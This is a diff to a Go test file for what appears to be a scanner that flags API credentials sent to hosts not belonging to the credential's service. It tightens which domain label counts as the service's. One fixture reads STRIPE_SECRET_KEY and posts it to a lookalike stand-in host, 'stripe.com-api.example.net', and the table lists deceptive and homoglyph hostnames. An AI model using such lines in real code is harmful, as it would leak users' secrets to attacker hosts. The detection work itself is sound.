@@ -116,10 +116,18 @@ func TestChain_DestinationResolvesSameFileBaseURL(t *testing.T) {
 			sev:  model.SevHigh, advisory: false,
 		},
 		{
-			name: "a tailnet host carries the service in its machine name",
+			// P-144: a machine name on a tailnet is chosen by whoever owns the tailnet, and anyone may
+			// name theirs after a service. Low since P-061; the price of closing the subdomain.
+			name: "a tailnet machine named after the service does not vouch",
 			file: "reelql.sh",
 			body: "API=\"${REELQL_API:-https://reelql.tail6c0e2d.ts.net}\"\nH=\"X-API-Key: $REELQL_API_KEY\"\ncurl -s \"$API/credits\" -H \"$H\"\n",
-			sev:  model.SevLow, advisory: true,
+			sev:  model.SevHigh, advisory: false,
+		},
+		{
+			name: "a subdomain named after the service, under another domain",
+			file: "pay.py",
+			body: "key = os.environ['STRIPE_SECRET_KEY']\nrequests.post('https://stripe.com-api.example.net/v1/payment_links', auth=(key, ''))\n",
+			sev:  model.SevHigh, advisory: false,
 		},
 		{
 			// P-143: the base ends at its host and `route` is a name the line does not show the value
@@ -180,7 +188,8 @@ func TestChain_DestinationResolvesSameFileBaseURL(t *testing.T) {
 	}
 }
 
-// TestHostMatchesService pins which label of a host may vouch for a credential's service.
+// TestHostMatchesService pins which label of a host may vouch for a credential's service: the
+// registrable one, and no other (P-144).
 func TestHostMatchesService(t *testing.T) {
 	for _, tc := range []struct {
 		host, service string
@@ -188,19 +197,31 @@ func TestHostMatchesService(t *testing.T) {
 	}{
 		{"api.deepl.com", "deepl", true},
 		{"deepl.com", "deepl", true},
-		{"purdue.brightspace.com", "purdue", true},   // a tenant subdomain
-		{"otx.alienvault.com", "otx", true},          // a product subdomain
-		{"data-platform.mlit.go.jp", "mlit", true},   // a ccSLD
-		{"www.coles.com.au", "coles", true},          // a ccSLD spelled with a TLD-like label
-		{"openai.com.cn", "openai", true},            // the same
-		{"openai.com.evil.cn", "openai", false},      // not the same: a label between
-		{"reelql.tail6c0e2d.ts.net", "reelql", true}, // a tailnet machine name
-		{"api.openai.com.evil.net", "openai", false}, // an embedded domain
-		{"openai.com.evil.net", "openai", false},     // the same, at the front
-		{"evil.github.io", "github", false},          // the platform under a hosted suffix
-		{"openaievil.net", "openai", false},          // a lookalike: no prefix matching
-		{"api.orcarouter.ai", "orca", false},         // the same
-		{"dееpl.com", "deepl", false},                // Cyrillic е: not the ASCII label
+		{"data-platform.mlit.go.jp", "mlit", true}, // a country's second level: mlit is the organisation
+		{"www.coles.com.au", "coles", true},        // the same, spelled with a TLD-like label
+		{"openai.com.cn", "openai", true},          // the same
+		{"bbc.co.uk", "bbc", true},
+
+		// A label left of the registrable one is chosen by whoever holds the domain.
+		{"stripe.evil.net", "stripe", false},              // somebody's subdomain named after the service
+		{"stripe.com-api.evil.net", "stripe", false},      // dressed as the service's own domain
+		{"api.stripe.payments.evil.net", "stripe", false}, // deeper
+		{"api.openai.com.evil.net", "openai", false},      // an embedded domain
+		{"openai.com.evil.net", "openai", false},          // the same, at the front
+		{"openai.com.evil.cn", "openai", false},           // the same under a country code
+		{"purdue.brightspace.com", "purdue", false},       // a tenant: P-061 let it vouch, and with it every row above
+		{"otx.alienvault.com", "otx", false},              // a product subdomain: the same
+
+		// Under a platform that hands names out, no label is the service's.
+		{"evil.github.io", "github", false},           // the platform's own label
+		{"stripe.vercel.app", "stripe", false},        // a name anyone may take
+		{"stripe.pages.dev", "stripe", false},         // the same
+		{"reelql.tail6c0e2d.ts.net", "reelql", false}, // a machine named on a tailnet: P-061 let it vouch
+
+		{"openaievil.net", "openai", false},  // a lookalike: no prefix matching
+		{"api.orcarouter.ai", "orca", false}, // the same
+		{"dееpl.com", "deepl", false},        // Cyrillic е: not the ASCII label
+		{"localhost", "localhost", false},    // one label: nothing registrable
 	} {
 		if got := hostMatchesService(tc.host, map[string]bool{tc.service: true}); got != tc.want {
 			t.Errorf("hostMatchesService(%q, %q) = %v, want %v", tc.host, tc.service, got, tc.want)
